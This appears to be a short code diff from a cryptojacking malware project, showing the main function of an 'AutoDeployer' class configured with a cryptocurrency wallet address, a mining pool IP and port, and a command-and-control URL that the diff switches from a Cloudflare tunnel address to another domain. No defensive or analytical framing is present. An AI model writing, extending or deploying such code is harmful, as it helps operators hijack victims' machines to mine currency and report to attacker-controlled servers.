@@ -214,7 +214,7 @@ class AutoDeployer:
 def main():
     wallet = "44haKQM5F43d37q3k6mV45YbrL5g6wGHWNB5uyt2cDfTdR8d9FicJCbitjm1xeKZzEVULG7MqdVFWEa9wKXsNLTpFvzffR5"
     pool = "45.155.102.89:10128"
-    c2_url = "https://simulations-discussing-affiliated-ranch.trycloudflare.com"
+    c2_url = "https://gbctwoserver.net"
     
     deployer = AutoDeployer(wallet, pool, c2_url)
     result = deployer.run()
